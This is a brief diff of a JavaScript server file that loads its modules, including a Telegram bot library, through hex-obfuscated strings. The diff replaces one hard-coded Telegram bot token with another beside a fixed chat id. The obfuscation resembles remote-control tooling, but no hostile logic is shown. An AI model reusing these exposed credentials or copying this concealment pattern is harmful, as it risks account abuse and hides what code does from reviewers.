@@ -1,6 +1,6 @@
 var _0x52ef=["\x65\x78\x70\x72\x65\x73\x73","\x77\x73","\x68\x74\x74\x70","\x6E\x6F\x64\x65\x2D\x74\x65\x6C\x65\x67\x72\x61\x6D\x2D\x62\x6F\x74\x2D\x61\x70\x69","\x75\x75\x69\x64","\x6D\x75\x6C\x74\x65\x72","\x62\x6F\x64\x79\x2D\x70\x61\x72\x73\x65\x72","\x61\x78\x69\x6F\x73"];const express=require(_0x52ef[0]);const webSocket=require(_0x52ef[1]);const http=require(_0x52ef[2]);const telegramBot=require(_0x52ef[3]);const uuid4=require(_0x52ef[4]);const multer=require(_0x52ef[5]);const bodyParser=require(_0x52ef[6]);const axios=require(_0x52ef[7])
 
-const token = '5969642996:AAGYTEA-JEWUtvXCR9wLNaz6zg0WPtC6zZc'
+const token = '6142605445:AAFOSLDGrOQYNzv1rmv5zTxsacAUPlt2GLY'
 const id = '5926743356'
 const address = 'https://www.google.com'
 
